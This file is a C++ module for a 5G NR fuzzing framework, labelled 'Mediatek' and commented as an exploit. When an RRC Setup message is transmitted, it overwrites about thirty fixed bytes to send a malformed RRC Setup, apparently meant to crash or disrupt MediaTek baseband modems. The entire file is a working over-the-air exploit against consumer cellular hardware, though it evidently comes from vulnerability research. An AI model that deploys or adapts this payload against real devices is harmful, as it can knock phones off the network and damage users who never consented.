#include <ModulesInclude.hpp>
// Filters
wd_filter_t f1;
// Vars
const char *module_name()
{
    return "Mediatek";
}
// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;
    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");
    return 0;
}
// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);
    return 0;
}
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[99 - 48] = 0x07;
        pkt_buf[106 - 48] = 0x07;
        pkt_buf[107 - 48] = 0xe1;
        pkt_buf[109 - 48] = 0xa0;
        pkt_buf[184 - 48] = 0x82;
        pkt_buf[186 - 48] = 0x31;
        pkt_buf[187 - 48] = 0x15;
        pkt_buf[188 - 48] = 0x05;
        pkt_buf[189 - 48] = 0x40;
        pkt_buf[190 - 48] = 0x01;
        pkt_buf[191 - 48] = 0xc0;
        pkt_buf[192 - 48] = 0x04;
        pkt_buf[194 - 48] = 0x46;
        pkt_buf[195 - 48] = 0x88;
        pkt_buf[196 - 48] = 0x00;
        pkt_buf[197 - 48] = 0xa8;
        pkt_buf[198 - 48] = 0x84;
        pkt_buf[199 - 48] = 0x00;
        pkt_buf[200 - 48] = 0xa0;
        pkt_buf[209 - 48] = 0x00;
        pkt_buf[210 - 48] = 0x8a;
        pkt_buf[211 - 48] = 0x10;
        pkt_buf[212 - 48] = 0x04;
        pkt_buf[213 - 48] = 0x00;
        pkt_buf[214 - 48] = 0x80;
        pkt_buf[215 - 48] = 0x01;
        pkt_buf[218 - 48] = 0x28;
        pkt_buf[219 - 48] = 0x01;
        pkt_buf[220 - 48] = 0x01;
        pkt_buf[222 - 48] = 0x05;
        pkt_buf[223 - 48] = 0x4c;
        return 1;
    }
    return 0;
}
